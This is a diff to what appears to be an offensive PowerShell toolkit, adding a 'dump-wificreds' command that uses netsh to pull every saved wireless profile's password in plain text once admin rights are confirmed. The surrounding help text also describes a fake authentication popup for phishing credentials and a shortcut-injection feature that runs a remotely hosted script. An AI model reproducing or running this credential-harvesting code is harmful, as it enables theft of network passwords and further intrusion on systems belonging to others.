@@ -138,6 +138,10 @@ askfor-creds
 	Performs some social engineering in order to aquire plain-text credentials. 
 	This is done by generating a authentication popup which seems to 
 	reconnect to a network share.
+	
+dump-wificreds
+	Dumps plain text passwords from wireless network profiles.
+	For this to work code must be executed as an administrator.
 
 shortcut-inject "name-of-lnk" "Url-hosting-script"
 	Modifies the specified shortcut to run the original program and also execute a 
@@ -281,6 +285,33 @@ function byte-decode( $b64file, $key ) {
 
 }
 
+function dump-wificreds {
+
+	$IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+	if ($IsAdmin) 
+	{ 
+
+		$rawp = (netsh wlan show profiles) | where { $_  -match "All User Profile" }
+		$profileData = "`n"		
+		foreach ( $a in $rawp) 
+		{ 
+
+			$profile = $a.split(':')[1].trim()
+			$pdata = (netsh wlan show profiles name=$profile key=clear) | where { $_ -match "Key Content" }
+	
+			if ($pdata) 
+			{ 
+				$password = $pdata.split(':')[1].trim()
+				$profileData += "[+] Network: [ $profile ] || Pass: [ $password ] `n"
+			}
+		
+		}
+		
+		return $profileData
+
+	} else {  $notAdmin = "`n[!] You have to run this function as Admin to get plain text creds! `n"; return $notAdmin }
+
+}
 
 #[->] thx Mubix for the idea ;)
 function askfor-creds {
